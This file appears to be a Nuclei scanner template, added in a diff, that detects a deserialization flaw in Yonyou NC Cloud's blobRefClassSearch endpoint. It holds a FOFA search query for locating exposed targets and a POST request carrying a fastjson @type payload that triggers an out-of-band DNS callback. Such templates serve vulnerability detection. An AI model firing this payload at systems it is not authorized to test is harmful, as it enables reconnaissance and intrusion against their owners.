@@ -1,0 +1,37 @@
+id: yongyou-nc-cloud-blobRefClassSearch-rce
+
+info:
+  name: 用友-nc-cloud-blobRefClassSea反序列化
+  author: god
+  severity: critical
+  description: 用友-nc-cloud-blobRefClassSea反序列化
+  metadata:
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,rce
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Connection: close
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Content-Length: 123
+
+    {
+      "clientParam": "{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"
+    }
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
